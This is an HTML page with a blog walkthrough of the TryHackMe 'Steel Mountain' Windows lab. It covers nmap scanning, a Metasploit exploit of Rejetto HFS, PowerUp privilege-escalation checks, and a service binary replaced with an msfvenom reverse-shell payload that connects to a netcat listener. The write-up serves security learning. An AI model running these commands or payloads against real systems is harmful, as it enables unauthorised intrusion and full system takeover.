@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="generator" content="Relearn 5.22.1+tip">
+    <meta name="description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilize powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.">
+    <meta name="author" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/walkthroughs/Steel%20Mountain/logo.png">
+  <meta name="twitter:title" content="Steel Mountain - TryHackMe">
+  <meta name="twitter:description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilize powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."><meta property="og:url" content="http://localhost:1313/walkthroughs/steel-mountain/">
+  <meta property="og:site_name" content="H1roBytes">
+  <meta property="og:title" content="Steel Mountain - TryHackMe">
+  <meta property="og:description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilize powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:1313/walkthroughs/Steel%20Mountain/logo.png">
+    <title>Steel Mountain - TryHackMe - H1roBytes</title>
+    <link href="/walkthroughs/steel-mountain/index.xml" rel="alternate" type="application/rss+xml" title="Steel Mountain - TryHackMe - H1roBytes">
+    <link href="/images/logo.png?1738202701" rel="icon" type="image/png">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1738202701" rel="stylesheet">
+    <link href="/css/auto-complete.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1738202701" rel="stylesheet">
+    <link href="/css/fonts.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1738202701" rel="stylesheet">
+    <link href="/css/theme-relearn-dark.css?1738202701" rel="stylesheet" id="R-variant-style">
+    <link href="/css/variant.css?1738202701" rel="stylesheet">
+    <link href="/css/print.css?1738202701" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1738202701" rel="stylesheet">
+    <script src="/js/url.js?1738202701"></script>
+    <script src="/js/variant.js?1738202701"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_Reset_view = 'Reset view';
+      window.T_View_reset = 'View reset!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='http:\/\/localhost:1313/';
+      window.variants && variants.init( [ 'relearn-dark', 'zen-dark', 'relearn-bright', 'relearn-light', 'zen-light', 'neon', 'learn', 'blue', 'green', 'red' ] );
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/walkthroughs/steel-mountain/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+              <button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)">
+                <i class="fa-fw fas fa-bars"></i>
+              </button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)">
+                <i class="fa-fw fas fa-list-alt"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#task-1-introduction">Task 1: Introduction</a></li>
+    <li><a href="#task-2-initial-access">Task 2 Initial Access</a></li>
+    <li><a href="#task3-privilege-escalation">Task3: Privilege Escalation</a></li>
+    <li><a href="#task-4-access-and-escalation-without-metasploit">Task 4: Access and Escalation Without Metasploit</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Steel Mountain - TryHackMe
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More">
+                <i class="fa-fw fas fa-ellipsis-v"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/hfs/index.html">HFS</a></li>
+    <li><a class="term-link" href="/tags/metasploit/index.html">Metasploit</a></li>
+    <li><a class="term-link" href="/tags/powershell/index.html">Powershell</a></li>
+    <li><a class="term-link" href="/tags/rejetto/index.html">Rejetto</a></li>
+    <li><a class="term-link" href="/tags/tryhackme/index.html">TryHackMe</a></li>
+    <li><a class="term-link" href="/tags/windows/index.html">Windows</a></li>
+  </ul>
+</div>
+            </header>
+<h1 id="steel-mountain---tryhackme">Steel Mountain - TryHackMe</h1>
+
+<p><a href="#R-image-c16c389cd9bc8f3f300cae2c3104fc9d" class="lightbox-link"><img src="/walkthroughs/steel-mountain/logo.png" alt="SteelMountainLogo" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c16c389cd9bc8f3f300cae2c3104fc9d"><img src="/walkthroughs/steel-mountain/logo.png" alt="SteelMountainLogo" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Date written: December 2023   <br>
+Date published: December 2023</p>
+<h2 id="task-1-introduction">Task 1: Introduction</h2>
+<p>&ldquo;In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.&rdquo; - 
+<a href="https://tryhackme.com/room/steelmountain" target="_blank">TryHackMe</a>.</p>
+<p>As always the first step to a TryHackMe room is to connect to either OpenVPN or AttackBox. I am going to use my own Kali virtual machine with OpenVPN for this room. If you have never connected to OpenVPN before see TryHackMe&rsquo;s 
+<a href="https://tryhackme.com/room/openvpn" target="_blank">room</a> on how to connect.</p>
+<p>Once the machine is deployed I read the first question and did, what I thought to be, the most logical option - open the machines IP in a web browser.</p>
+<p>Success, there is a web page tied to this machine. The web page has an image of Steel Mountain&rsquo;s Employee of the Month and not much else. If you right click and select &ldquo;inspect&rdquo; the browser will bring up the developer tools and show the source code. The same thing can be achieved by selecting &ldquo;Ctrl + U&rdquo; on your keyboard. This will open the source code in a new window instead of the same window.</p>
+<p>Once the source code is displayed I see that the image is titled BillHarper.png, leading me to believe the employees name is Bill Harper.</p>
+<blockquote>
+<p>Deploy the machine. Who is the employee of the month?</p>
+</blockquote>
+<blockquote>
+<p>Answer: Bill Harper</p>
+</blockquote>
+<h2 id="task-2-initial-access">Task 2 Initial Access</h2>
+<p>Next I&rsquo;ll run a basic NMAP scan on the machine <code>nmap 10.10.14.216</code>.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap 10.10.14.216         
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-11-25 22:54 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.14.216
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown</span></span></code></pre></div><p><a href="#R-image-e97e7660a3374a0819409c6a1829b8a1" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_nmap_basic.png" alt="BasicNMAP" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e97e7660a3374a0819409c6a1829b8a1"><img src="/walkthroughs/steel-mountain/task2_nmap_basic.png" alt="BasicNMAP" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>So I see that the machines has 11 ports open, some of which do not have a service identified, but I don&rsquo;t need to know those just yet.</p>
+<p>Now I know port 80 and 443 are the standard ports for webservers/websites, but what if those were the only ports I knew about. Well there is one port that seems similar and has a similar service so I could guess, but I could also research non-standard ports.</p>
+<ul>
+<li>
+<p>
+<a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=8080#Aronetics_LLC" target="_blank">Internet Assigned Numbers Authority</a></p>
+</li>
+<li>
+<p>
+<a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers" target="_blank">Wikipedia: List of TCP and UDP port numbers</a></p>
+</li>
+<li>
+<p>
+<a href="https://www.jscape.com/blog/using-nonstandard-ports-is-security-through-obscurity-really-bad" target="_blank">Port Confusion - Is Security Through Obscurity Bad?</a></p>
+</li>
+<li>
+<p>
+<a href="https://blog.sonicwall.com/en-us/2019/05/non-standard-ports-are-under-cyberattack/" target="_blank">Non-Standard Ports are Under Cyberattack</a></p>
+</li>
+</ul>
+<p>After some research I now know that the nonstandard webserver port is port 8080. I also know that non-standard ports are a security risk.</p>
+<blockquote>
+<p>Scan the machine with nmap. What is the other port running a web server on?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 8080</p>
+</blockquote>
+<p>The next question asks you to look at the other webserver and I can do that by designating which port I want the traffic routed to by putting a colon at the end my IP and typing the port. <code>MACHINE_IP:8080</code></p>
+<p>After navigating to port 8080 I see that the server is running HTTP File Server (HFS) by Rejetto. Clicking on the HFS file version number will take you to the 
+<a href="https://www.rejetto.com/hfs/" target="_blank">introduction page</a> for HFS.</p>
+<blockquote>
+<p>Take a look at the other web server. What file server is running?</p>
+</blockquote>
+<blockquote>
+<p>Answer: Rejetto HTTP File Server</p>
+</blockquote>
+<p>The next two questions I strung together a little to be able to find the correct CVE number. In searchsploit I searched for <code>HFS 2.3</code> which returned only a few results, but filtered down to the only Metasploit module since the following question states to use Metasploit.</p>
+<p>Once my results were filtered down I used the <code>-p</code> flag to find the exploit database link, which then displays the CVE number.</p>
+<p><code>searchsploit 34926 -p</code></p>
+<p><a href="#R-image-46d3f7e090e39674e0739ad13f1ee780" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_searchsploit.png" alt="Searchsploit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-46d3f7e090e39674e0739ad13f1ee780"><img src="/walkthroughs/steel-mountain/task2_searchsploit.png" alt="Searchsploit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-1e24884d747e1e8157c012f912c72b12" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_cve.png" alt="ExploitDB" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-1e24884d747e1e8157c012f912c72b12"><img src="/walkthroughs/steel-mountain/task2_cve.png" alt="ExploitDB" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>What is the CVE number to exploit this file server?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 2014-6287</p>
+</blockquote>
+<p>Then I launched Metasploit with <code>msfconsole</code>. If you have never interacted with Metasploit before I highly recommend going through a few tutorials or courses to get the feel for the tool.</p>
+<ul>
+<li>
+<a href="https://nooblinux.com/metasploit-tutorial/" target="_blank">N00BLinux - Metasploit Tutorial for Beginners – Basics to Advanced</a></li>
+<li>
+<a href="https://hackersploit.org/" target="_blank">Hackersploit</a> has a phenomenal course for just about everything pentest related, but I&rsquo;ve gone through his 
+<a href="https://hackersploit.org/metasploit-tutorials/" target="_blank">Metasploit</a> course and love it. He also teaches most of the eJPT course from eLearnSecurity.</li>
+</ul>
+<p>I then searched for hfs 2.3 and looked for an exploit with the same name or description as the one we saw on the exploit database. After the search completed and I found a module I selected it with <code>use 1</code> which is the ID of the exploit. I could have also used <code>use /exploit/windows/http/rejetto_hfs_exec</code>.</p>
+<p><a href="#R-image-27691d69ad7d07f73ee67231655e212f" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_metasploit.png" alt="Metasploit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-27691d69ad7d07f73ee67231655e212f"><img src="/walkthroughs/steel-mountain/task2_metasploit.png" alt="Metasploit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Next I ran <code>show options</code> to see which options I needed to set. The only things that I have to set for this module are RHOSTS and RPORT, which can be set with <code>set RHOSTS TARGET_IP</code> and <code>set RPORT 8080</code>.</p>
+<p><a href="#R-image-4ca42d6ae93169577cb564403f2b4fd2" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_metasploit2.png" alt="Metasploit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4ca42d6ae93169577cb564403f2b4fd2"><img src="/walkthroughs/steel-mountain/task2_metasploit2.png" alt="Metasploit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Type <code>run</code> or <code>exploit</code> to start the attack.</p>
+
+<div class="box notices cstyle note">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-circle"></i> Note</div>
+  <div class="box-content">
+
+<p>I did switch from a Kali VM to TryHackMe&rsquo;s attackbox here due to some network throttling.</p>
+</div>
+</div>
+<p><a href="#R-image-27c4742e47d839cba57ef6d64f473e0b" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_metasploitShell.png" alt="MetasploitShell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-27c4742e47d839cba57ef6d64f473e0b"><img src="/walkthroughs/steel-mountain/task2_metasploitShell.png" alt="MetasploitShell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Now that I have a shell I have to figure out where the Meterpreter shell is located by running <code>ls</code> to list out what files are in my current location and then <code>pwd</code> to print the working directory path.</p>
+<p>The shell is in the <strong>C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</strong> folder so to get to the flag I need to move to Bill&rsquo;s Desktop by using the <code>cd</code> command. Once I have moved to the Desktop I can <code>cat</code> the flag. I did notice that the windows command of type does not work here which is strange.</p>
+<p><a href="#R-image-1eb27af281dcc922993f9c736450e63d" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task2_user.png" alt="User.txt" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-1eb27af281dcc922993f9c736450e63d"><img src="/walkthroughs/steel-mountain/task2_user.png" alt="User.txt" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Use Metasploit to get an initial shell. What is the user flag?</p>
+</blockquote>
+<blockquote>
+<p>Answer: cat the contents of &ldquo;user.txt&rdquo;. There are two characters on the front of the flag that you do not need.</p>
+</blockquote>
+<h2 id="task3-privilege-escalation">Task3: Privilege Escalation</h2>
+<p>On your machine you will want do download a Powershell script called PowerUp. First you will want to navigate to the Github page provided in THM.</p>
+<p><a href="#R-image-ce6ad76be6d400add69c03e0af770ad4" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_PowerUp_GitHub.png" alt="Github" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ce6ad76be6d400add69c03e0af770ad4"><img src="/walkthroughs/steel-mountain/task3_PowerUp_GitHub.png" alt="Github" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Select &ldquo;Raw&rdquo;. Then use 
+<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank">this link</a> with our <code>wget</code> command.</p>
+
+<div class="box notices cstyle note">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-circle"></i> Note</div>
+  <div class="box-content">
+
+<p>Learn more about wget 
+<a href="https://www.geeksforgeeks.org/wget-command-in-linux-unix/" target="_blank">here</a>.</p>
+</div>
+</div>
+<p><a href="#R-image-97fa1c318972331d12fba0f0f8f53af1" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_PowerUp_GitHubRAW.png" alt="Github Raw" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-97fa1c318972331d12fba0f0f8f53af1"><img src="/walkthroughs/steel-mountain/task3_PowerUp_GitHubRAW.png" alt="Github Raw" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><code>cd</code> into your <strong>/opt</strong> directory and type <code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</code>. This will download the script to your /opt directory.</p>
+<p><a href="#R-image-62b565daf9f7aff8188a6f1be24638af" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_PowerUp.png" alt="wget" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-62b565daf9f7aff8188a6f1be24638af"><img src="/walkthroughs/steel-mountain/task3_PowerUp.png" alt="wget" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After you have the PowerUp script downloaded to your machine go back to your Meterpreter shell to upload the script with <code>upload /opt/PATH TO POWERUP</code>.</p>
+<p><a href="#R-image-c186657ce67af77a42e68c398d1f0d65" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_PowerUp_Upload.png" alt="Upload" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c186657ce67af77a42e68c398d1f0d65"><img src="/walkthroughs/steel-mountain/task3_PowerUp_Upload.png" alt="Upload" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once uploaded you can load power shell with <code>load powershell</code> and then <code>powershell_shell</code>. After it is loaded the next thing to do is run the script with <code>. .\PowerUp.ps1</code> and then <code>Invoke-AllChecks</code>. If one of these does not work make sure your are in the correct directory with in Meterpreter and that you are putting a space between the two periods when invoking the script.</p>
+<p><a href="#R-image-0220964b55dee528dd7b3fb950b92ea2" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_PowerUp_InvokeAllChecks.png" alt="Load Powershell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0220964b55dee528dd7b3fb950b92ea2"><img src="/walkthroughs/steel-mountain/task3_PowerUp_InvokeAllChecks.png" alt="Load Powershell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>After waiting some time you will get a long list of results. The one we are specifically looking for is one where the service can be restarted.</p>
+<blockquote>
+<p>Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?</p>
+</blockquote>
+<blockquote>
+<p>Answer: AdvancedSystemCareService9</p>
+</blockquote>
+<p><a href="#R-image-a5a0dd324505163e939ab68a494cee38" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_CanRestart.png" alt="Can Restart" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a5a0dd324505163e939ab68a494cee38"><img src="/walkthroughs/steel-mountain/task3_CanRestart.png" alt="Can Restart" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Now that we know the service the next thing to do is to create an msfvenom shell. Back on your desktop open a new terminal and type in <code>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe</code></p>
+<p><a href="#R-image-637cb12ad2a88aba6668e08cdb7512ee" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_msfvenom.png" alt="MSFvenom" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-637cb12ad2a88aba6668e08cdb7512ee"><img src="/walkthroughs/steel-mountain/task3_msfvenom.png" alt="MSFvenom" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+
+<div class="box notices cstyle note">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-circle"></i> Note</div>
+  <div class="box-content">
+
+<p>Learn more about <strong>msfvenom</strong>:</p>
+<ul>
+<li>
+<a href="https://www.offsec.com/metasploit-unleashed/msfvenom/" target="_blank">Metasploit Unleashed by Offsec</a></li>
+<li>
+<a href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/" target="_blank">Msfvenom Tutorials for Beginners</a></li>
+<li>
+<a href="https://www.geeksforgeeks.org/working-with-payload-metasploit-in-kali-linux/" target="_blank">Working with Payload Metasploit in Kali Linux by Geeks for Geeks</a></li>
+</ul>
+</div>
+</div>
+<p>In a new terminal or clear your existing one we want to start a 
+<a href="https://blog.natem135.com/posts/using-a-netcat-listener/" target="_blank">Netcat listener</a> on the same port as your specified msfvenom shell - port 1234.</p>
+<p><a href="#R-image-e24112ca2155357bb17095b54ac23a34" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_NC_Listener.png" alt="NC Listener" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e24112ca2155357bb17095b54ac23a34"><img src="/walkthroughs/steel-mountain/task3_NC_Listener.png" alt="NC Listener" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Moving back to your Meterpreter shell use <code>Ctrl+C</code> to exit powershell and <code>cd</code> to <strong>&ldquo;C:\Program Files (x86)\IObit\Advanced SystemCare&rdquo;</strong>.</p>
+<p>Once in the Advanced systemCare directory you will want to type <code>shell</code> to get a regular command shell. Then you can stop the AdvancedSystemCareService9 service with <code>sc stop AdvancedSystemCareService9</code>. If you try to upload your shell before stopping the service you will get an error.</p>
+<p><a href="#R-image-14375ce2d0aad190ea842837801da55e" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_Shell_Service_Stop.png" alt="Stop service" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-14375ce2d0aad190ea842837801da55e"><img src="/walkthroughs/steel-mountain/task3_Shell_Service_Stop.png" alt="Stop service" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once the service is stopped we can upload our shell with the same upload command as before, but make sure you type <code>^c</code> to get back to a Meterpreter shell first.</p>
+<p><a href="#R-image-fa16617ed7d490a40ea2870628c5fbbe" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_msfvenom_Upload.png" alt="Upload shell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fa16617ed7d490a40ea2870628c5fbbe"><img src="/walkthroughs/steel-mountain/task3_msfvenom_Upload.png" alt="Upload shell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once uploaded type <code>shell</code> again and start the service with <code>sc start AdvancedSystemCareService9</code>.</p>
+<p><a href="#R-image-8790be178e41914f2c409dd8b7801b96" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_Shell_Service_Start.png" alt="Start service" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8790be178e41914f2c409dd8b7801b96"><img src="/walkthroughs/steel-mountain/task3_Shell_Service_Start.png" alt="Start service" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.</p>
+<p>Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>Now go back to your Netcat listener and you should have a shell.</p>
+<p><a href="#R-image-b3543396f9d7cb2565d1c7bf5e91bfaf" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_whoami.png" alt="whoami" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b3543396f9d7cb2565d1c7bf5e91bfaf"><img src="/walkthroughs/steel-mountain/task3_whoami.png" alt="whoami" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Finally cd to your Desktop and <code>type</code> the contents of your root flag.</p>
+<blockquote>
+<p>What is the root flag?</p>
+</blockquote>
+<blockquote>
+<p>Answer: <code>type</code> the contents of the &ldquo;root.txt&rdquo; file located on the Administrators Desktop</p>
+</blockquote>
+<p><a href="#R-image-b4e5ad4a5e0963c4ce65709a0454d127" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task3_root.png" alt="Root" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b4e5ad4a5e0963c4ce65709a0454d127"><img src="/walkthroughs/steel-mountain/task3_root.png" alt="Root" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="task-4-access-and-escalation-without-metasploit">Task 4: Access and Escalation Without Metasploit</h2>
+<p>First, I love that THM goes through rooms with and then with out Metasploit, because some clients and exams don&rsquo;t allow for the use of Metasploit. If you get stuck and need a small hint 
+<a href="https://www.youtube.com/watch?v=BzmljZkgeSs" target="_blank">Hacksploit</a> has a great walkthrough.</p>
+
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Warning</div>
+  <div class="box-content">
+
+<p>You will not be able to use THM built in AttackBox for this section. A Python server is needed on port 80 and it conflicts with AttackBox.</p>
+</div>
+</div>
+<p>First you will want to use searchsploit or the exploit database to find your exploit code. I used <code>searchsploit Rejetto HTTP File Server 2.3.x</code> and then used the -p flag to view the full exploit path. Once you know where it is you can copy the file to a new location. I used exploit.py on my Desktop.</p>
